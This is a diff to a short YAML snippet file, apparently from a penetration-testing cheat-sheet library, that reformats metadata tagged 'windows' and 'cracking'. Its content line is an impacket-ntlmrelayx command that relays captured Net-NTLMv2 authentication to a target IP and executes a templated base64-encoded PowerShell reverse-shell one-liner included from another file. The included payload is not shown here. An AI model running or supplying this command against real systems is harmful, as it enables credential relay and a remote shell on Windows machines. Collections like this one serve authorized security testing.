@@ -1,9 +1,9 @@
+---
 metadata:
-  filename: impacket-ntlmrelayx-relaying-Net-NTLMv2-powershell-oneliner-base64encoded.yaml
-  tags:
-  - windows
-  - cracking
-  created: '2025-03-29'
-  author: Unknown
+  filename: "impacket-ntlmrelayx-relaying-Net-NTLMv2-powershell-oneliner-base64encoded.yaml"
+  tags: ["windows", "cracking"]
+  created: "2025-03-29"
+  author: "Unknown"
+
 content: |
   impacket-ntlmrelayx --no-http-server -smb2support -t <ip> -c "{{ payload | default(include('payloads/revshell-windows-powershell-oneliner-base64encoded.yaml')) }}"
